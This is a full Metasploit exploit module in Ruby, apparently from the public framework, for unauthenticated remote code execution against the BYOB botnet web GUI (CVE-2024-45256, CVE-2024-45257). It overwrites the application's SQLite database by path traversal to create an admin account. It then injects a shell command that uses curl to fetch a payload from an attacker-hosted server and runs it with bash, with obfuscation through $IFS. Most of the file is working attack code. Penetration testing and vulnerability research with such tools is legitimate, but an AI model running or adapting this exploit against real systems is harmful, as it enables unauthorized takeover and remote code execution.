##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'sqlite3'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'BYOB Unauthenticated RCE via Arbitrary File Write and Command Injection (CVE-2024-45256, CVE-2024-45257)',
        'Description' => %q{
          This module exploits two vulnerabilities in the BYOB (Build Your Own Botnet) web GUI:
          1. CVE-2024-45256: Unauthenticated arbitrary file write that allows modification of the SQLite database, adding a new admin user.
          2. CVE-2024-45257: Authenticated command injection in the payload generation page.

          These vulnerabilities remain unpatched.
        },
        'Author' => [
          'chebuya', # Discoverer and PoC
          'Valentin Lobstein' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-45256'],
          ['CVE', '2024-45257'],
          ['URL', 'https://blog.chebuya.com/posts/unauthenticated-remote-command-execution-on-byob/']
        ],
        'Platform' => %w[unix linux],
        'Arch' => %w[ARCH_CMD],
        'Targets' => [
          [
            'Unix/Linux Command Shell', {
              'Platform' => %w[unix linux],
              'Arch' => ARCH_CMD,
              'Privileged' => true
              # tested with cmd/linux/http/x64/meterpreter/reverse_tcp
            }
          ]
        ],
        'DisclosureDate' => '2024-08-15',
        'DefaultTarget' => 0,
        'DefaultOptions' => { 'SRVPORT' => 5000 },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [false, 'Username for new admin', 'admin']),
        OptString.new('PASSWORD', [false, 'Password for new admin', nil])
      ]
    )
  end

  def primer
    add_resource('Path' => '/', 'Proc' => proc { |cli, req| on_request_uri_payload(cli, req) })
    print_status('Payload is ready at /')
  end

  def on_request_uri_payload(cli, request)
    handle_request(cli, request, payload.encoded)
  end

  def handle_request(cli, request, response_payload)
    print_status("Received request at: #{request.uri} - Client Address: #{cli.peerhost}")

    case request.uri
    when '/'
      print_status("Sending response to #{cli.peerhost} for /")
      send_response(cli, response_payload)
    else
      print_error("Request for unknown resource: #{request.uri}")
      send_not_found(cli)
    end
  end

  def check
    random_data = Rex::Text.rand_text_alphanumeric(32)
    random_filename = Rex::Text.rand_text_alphanumeric(16)
    random_owner = Rex::Text.rand_text_alphanumeric(8)
    random_module = Rex::Text.rand_text_alphanumeric(6)
    random_session = Rex::Text.rand_text_alphanumeric(6)

    form_data = {
      'data' => random_data,
      'filename' => random_filename,
      'type' => 'txt',
      'owner' => random_owner,
      'module' => random_module,
      'session' => random_session
    }

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'api', 'file', 'add'),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => form_data,
      'keep_cookies' => true
    })

    if res&.code == 500
      CheckCode::Vulnerable
    else
      (res&.code == 200 ? CheckCode::Safe : CheckCode::Unknown)
    end
  end

  def get_csrf(path)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, path),
      'keep_cookies' => true
    })

    fail_with(Failure::UnexpectedReply, 'Could not retrieve CSRF token') unless res

    csrf_token = res.get_html_document.at_xpath("//input[@name='csrf_token']/@value")&.text
    fail_with(Failure::UnexpectedReply, 'CSRF token not found') if csrf_token.nil?

    csrf_token
  end

  def register_user(username, password)
    csrf_token = get_csrf('register')

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'register'),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'csrf_token' => csrf_token,
        'username' => username,
        'password' => password,
        'confirm_password' => password,
        'submit' => 'Sign Up'
      },
      'keep_cookies' => true
    })

    res&.code == 302 ? print_good('Registered user!') : fail_with(Failure::UnexpectedReply, "User registration failed: #{res.code}")
  end

  def login_user(username, password)
    csrf_token = get_csrf('login')

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'login'),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'csrf_token' => csrf_token,
        'username' => username,
        'password' => password,
        'submit' => 'Log In'
      },
      'keep_cookies' => true
    })

    res&.code == 302 ? print_good('Logged in successfully!') : fail_with(Failure::UnexpectedReply, "Login failed: #{res.code}")
  end

  def generate_malicious_db(_username, _password)
    mem_db = SQLite3::Database.new(':memory:')

    mem_db.execute <<-SQL
            CREATE TABLE user (
            id INTEGER NOT NULL,
            username VARCHAR(32) NOT NULL,
            password VARCHAR(60) NOT NULL,
            joined DATETIME NOT NULL,
            bots INTEGER,
            PRIMARY KEY (id),
            UNIQUE (username)
            );
    SQL

    mem_db.execute <<-SQL
            CREATE TABLE session (
            id INTEGER NOT NULL,
            uid VARCHAR(32) NOT NULL,
            online BOOLEAN NOT NULL,
            joined DATETIME NOT NULL,
            last_online DATETIME NOT NULL,
            public_ip VARCHAR(42),
            local_ip VARCHAR(42),
            mac_address VARCHAR(17),
            username VARCHAR(32),
            administrator BOOLEAN,
            platform VARCHAR(5),
            device VARCHAR(32),
            architecture VARCHAR(2),
            latitude FLOAT,
            longitude FLOAT,
            new BOOLEAN NOT NULL,
            owner VARCHAR(120) NOT NULL,
            PRIMARY KEY (uid),
            UNIQUE (uid),
            FOREIGN KEY(owner) REFERENCES user (username)
            );
    SQL

    mem_db.execute <<-SQL
            CREATE TABLE payload (
            id INTEGER NOT NULL,
            filename VARCHAR(34) NOT NULL,
            operating_system VARCHAR(3),
            architecture VARCHAR(14),
            created DATETIME NOT NULL,
            owner VARCHAR(120) NOT NULL,
            PRIMARY KEY (id),
            UNIQUE (filename),
            FOREIGN KEY(owner) REFERENCES user (username)
            );
    SQL

    mem_db.execute <<-SQL
            CREATE TABLE exfiltrated_file (
            id INTEGER NOT NULL,
            filename VARCHAR(34) NOT NULL,
            session VARCHAR(15) NOT NULL,
            module VARCHAR(15) NOT NULL,
            created DATETIME NOT NULL,
            owner VARCHAR(120) NOT NULL,
            PRIMARY KEY (id),
            UNIQUE (filename),
            FOREIGN KEY(owner) REFERENCES user (username)
            );
    SQL

    mem_db.execute <<-SQL
            CREATE TABLE task (
            id INTEGER NOT NULL,
            uid VARCHAR(32) NOT NULL,
            task TEXT,
            result TEXT,
            issued DATETIME NOT NULL,
            completed DATETIME,
            session VARCHAR(32) NOT NULL,
            PRIMARY KEY (id),
            UNIQUE (uid),
            FOREIGN KEY(session) REFERENCES session (uid)
            );
    SQL

    file = Tempfile.new('database.db')
    src_db = SQLite3::Database.new(file.path)
    backup = SQLite3::Backup.new(src_db, 'main', mem_db, 'main')
    backup.step(-1)
    backup.finish

    binary_data = File.binread(file.path)

    base64_data = Rex::Text.encode_base64(binary_data)

    file.close
    file.unlink

    base64_data
  end

  def upload_database_multiple_paths(encoded_db)
    success = false
    filepaths = [
      '/proc/self/cwd/buildyourownbotnet/database.db',
      '/proc/self/cwd/../buildyourownbotnet/database.db',
      '/proc/self/cwd/../../../../buildyourownbotnet/database.db',
      '/proc/self/cwd/instance/database.db',
      '/proc/self/cwd/../../../../instance/database.db',
      '/proc/self/cwd/../instance/database.db'
    ]

    filepaths.each do |filepath|
      vprint_status("Trying to upload database to path: #{filepath}")

      form_data = {
        'data' => encoded_db,
        'filename' => filepath,
        'type' => 'txt',
        'owner' => Faker::Internet.username,
        'module' => Faker::App.name.downcase,
        'session' => Faker::Alphanumeric.alphanumeric(number: 8)
      }

      res = send_request_cgi(
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'api', 'file', 'add'),
        'ctype' => 'application/x-www-form-urlencoded',
        'vars_post' => form_data,
        'keep_cookies' => true
      )

      if res&.code == 200
        (print_good("Database uploaded successfully to path: #{filepath}")
         success = true)
      else
        vprint_error("Failed to upload database to path: #{filepath}")
      end
    end

    success
  end

  def exploit
    # Start necessary services and perform initial setup
    start_service
    primer

    # Define or generate admin credentials
    username = datastore['USERNAME'] || 'admin'
    password = datastore['PASSWORD'] || Rex::Text.rand_text_alphanumeric(12)

    # Generate and upload the malicious SQLite database
    print_status('Generating malicious SQLite database.')
    encoded_db = generate_malicious_db(username, password)

    unless upload_database_multiple_paths(encoded_db)
      fail_with(Failure::UnexpectedReply, 'Failed to upload the database from all known paths')
    end
    print_good('Malicious database uploaded successfully.')

    # Register the new admin user
    print_status("Registering a new admin user: #{username}:#{password}")
    register_user(username, password)

    # Log in with the newly created admin user
    print_status('Logging in with the new admin user.')
    login_user(username, password)

    # Prepare the malicious payload and inject it via command injection
    print_status('Injecting payload via command injection.')

    uri = get_uri.gsub(%r{^https?://}, '').chomp('/')
    random_filename = ".#{Rex::Text.rand_text_alphanumeric(rand(3..5))}"
    malicious_filename = "curl$IFS-k$IFS@#{uri}$IFS-o$IFS#{random_filename}&&bash$IFS#{random_filename}"

    payload_data = {
      'format' => 'exe',
      'operating_system' => "nix$(#{malicious_filename})",
      'architecture' => 'amd64'
    }

    # Send the command injection request
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'api', 'payload', 'generate'),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => payload_data,
      'keep_cookies' => true
    }, 0)

    # Keep the web server running to maintain the service
    service.wait
  end
end
